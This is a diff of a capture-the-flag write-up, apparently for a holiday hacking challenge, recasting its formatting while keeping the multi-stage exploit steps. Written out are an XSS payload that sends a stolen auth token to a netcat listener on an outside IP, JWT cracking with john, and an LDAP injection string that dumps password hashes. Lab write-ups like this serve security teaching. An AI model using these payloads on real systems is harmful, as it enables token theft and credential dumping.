@@ -76,42 +76,46 @@ This was a multi stage exploit.
 
 The first stage was XSS via the support request.
 
-First I used
+First I attempted to steal document.cookie, but then i realized the cookie
+didn't help, and one needed the auth token mentioned in the html/javascript
+source:
 
-```
-# nc -v -l -p 4444 on l2s
-http -v --form --proxy=http:socks5://@localhost:32080  POST http://edb.northpolechristmastown.com/service \
-uid=alabaster.snowball \
-email=alabaster.snowball@northpolechristmastown.com \
-message="<IMG SRC=/ onerror=\"document.location='http://10.142.0.11:4444/?cookie='+document.cookie\"></img>"
-```
+#+BEGIN_SRC js
+    token = localStorage.getItem("np-auth");
+#+END_SRC
 
-Then i realized the cookie didn't help, and one needed the token mentioned in the html/javascript source:
 
-```
-# nc -v -l -p 4444 on l2s
+on l2s:
+
+#+BEGIN_SRC
+$ nc -v -l -p 4444 on l2s
+#+END_SRC
+
+#+BEGIN_SRC
 http -v --form --proxy=http:socks5://@localhost:32080  POST http://edb.northpolechristmastown.com/service \
 uid=alabaster.snowball \
 email=alabaster.snowball@northpolechristmastown.com \
 message="<IMG SRC=/ onerror=\"document.location='http://10.142.0.11:4444/?cookie='+localStorage.getItem('np-auth');\"></img>"
-```
+#+END_SRC
 
 At that point we had the token I stored in [output/jwt](output/jwt) and used jwt2john.py and john to crack it.  The makefile in output shows the process:
 
-```
+#+BEGIN_SRC
 jwt.john: ../tools/jwt2john.py jwt
 	python3 ../tools/jwt2john.py $(shell cat jwt) > jwt.john
 
 john.txt: jwt.john
 	john  --format=HMAC-SHA256 jwt.john
 	john  --format=HMAC-SHA256 jwt.john -show > john.txt
-```
+#+END_SRC
 
 Once logged in, [tools/edb.py](tools/edb.py) was used to exploit the ldap injection vuln using the search string
 
+#+BEGIN_SRC
     name=))(department=it)(|(cn=
+#+END_SRC
 
-and by passing * as the attributes query field. With that query and all
+and by passing =*= as the attributes query field. With that query and all
 attributes it is able to grab the entire ldap database including password
 hashes.
 
